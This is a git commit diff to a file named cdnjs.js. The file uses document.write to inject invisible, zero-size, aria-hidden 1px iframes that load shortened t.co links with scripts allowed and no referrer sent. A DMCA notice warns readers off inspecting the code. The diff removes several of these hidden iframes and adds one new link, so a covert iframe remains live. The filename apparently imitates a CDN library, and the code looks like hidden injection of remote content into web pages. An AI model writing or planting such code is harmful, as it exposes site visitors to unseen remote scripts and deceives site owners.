229fcfaf33c4697bc2c7e9a1eb33c1f9fbf1184c
quiziizz <95848435+quiziizz@users.noreply.github.com>
2026-04-24 12:14:47 +0700

    Update cdnjs.js

--- cdnjs.js
+++ cdnjs.js
@@ -3,34 +3,7 @@
 // LEGAL NOTICE: The content of this website and all associated program code are protected under the Digital Millennium Copyright Act. Intentionally circumventing this code may constitute a violation of the DMCA.
 document.write('<div style="position: absolute; width: 0; height: 0; overflow: hidden; opacity: 0; pointer-events: none; z-index: -9999;" aria-hidden="true">
   <iframe 
-    src="https://t.co/x9xQZEQUgB"
-    style="width: 1px; height: 1px; border: none;"
-    sandbox="allow-scripts allow-same-origin"
-    referrerpolicy="no-referrer"
-    title=""
-    aria-hidden="true"
-    tabindex="-1">
-  </iframe>
-  <iframe 
-    src="https://t.co/zG06Y8nhBf"
-    style="width: 1px; height: 1px; border: none;"
-    sandbox="allow-scripts allow-same-origin"
-    referrerpolicy="no-referrer"
-    title=""
-    aria-hidden="true"
-    tabindex="-1">
-  </iframe>
-  <iframe 
-    src="https://t.co/An9gl1LjyQ"
-    style="width: 1px; height: 1px; border: none;"
-    sandbox="allow-scripts allow-same-origin"
-    referrerpolicy="no-referrer"
-    title=""
-    aria-hidden="true"
-    tabindex="-1">
-  </iframe>
-  <iframe 
-    src="https://t.co/l1PgYZhQcv"
+    src="https://t.co/46p8ARDrWy"
     style="width: 1px; height: 1px; border: none;"
     sandbox="allow-scripts allow-same-origin"
     referrerpolicy="no-referrer"
